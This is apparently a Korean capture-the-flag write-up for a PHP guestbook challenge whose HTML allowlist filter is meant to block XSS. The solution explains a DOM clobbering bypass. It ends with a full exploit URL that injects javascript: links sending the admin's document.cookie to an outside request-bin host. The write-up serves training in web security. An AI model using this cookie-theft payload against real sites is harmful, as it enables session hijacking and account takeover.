## Guest book v0.2
---

```php
<?php
function addLink($content){
  $content = htmlentities($content);
  $content = preg_replace('/\[(.*?)\]\((.*?)\)/', "<a href='$2'>$1</a>", $content);
  PreventXSS($content);
  return $content;
}

$ALLOW_TAGS_ATTRS = array(
  "html"=>['id', 'name'],
  "body"=>['id', 'name'],
  "a"=>['id','href','name'],
  "p"=>['id', 'name'],
);

function PreventXSS($input){
  global $ALLOW_TAGS_ATTRS;

  $htmldoc = new DOMDocument();
  $htmldoc->loadHTML($input);

  $tags = $htmldoc->getElementsByTagName("*");
    
  foreach ($tags as $tag) {
    if( !$ALLOW_TAGS_ATTRS[strtolower($tag->nodeName)] ) DisallowAction();
    $allow_attrs = $ALLOW_TAGS_ATTRS[strtolower($tag->nodeName)];
    foreach($tag->attributes as $attr){
        if( !in_array(strtolower($attr->nodeName), $allow_attrs) ) DisallowAction();
    }
  }
}

function DisallowAction(){
	die("no hack");
}

?>
```

<br>

```
php로 개발 중인 방명록 서비스입니다.

글을 쓰는 기능과, 오류가 발생하는 주소를 관리자가 확인할 수 있도록 하는 Report기능이 존재합니다.

플래그는 관리자의 쿠키에 포함되어 있습니다.

0.1 버전에서 발견된 취약점을 방어하는 코드가 추가되었습니다.
```

<br><br>

## Solution
---

GuestBook에서 내가 푼 방식으로는 이 문제를 풀 수 없다.

이 문제에서는 사용 가능한 속성을 지정해줬기 때문에 id, name, href만 사용 가능하다.

아마 내가 푼 방식이 출제자가 의도했던 방식? 이라고 생각된다(?)

<br>

그래서 이 문제는 DOM Clobbering으로 풀어줘야 한다.

이미 GuestBook을 풀 때 해봤으므로 바로 익스플로잇 해주면 된다.

<br>

```
GuestBook.php/?content=[a](javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='main)%0d%0a[a](javascript:location.href=`http://xauitam.request.dreamhack.games?cookie=`%2bdocument.cookie' id='CONFIG' name='debug)
```
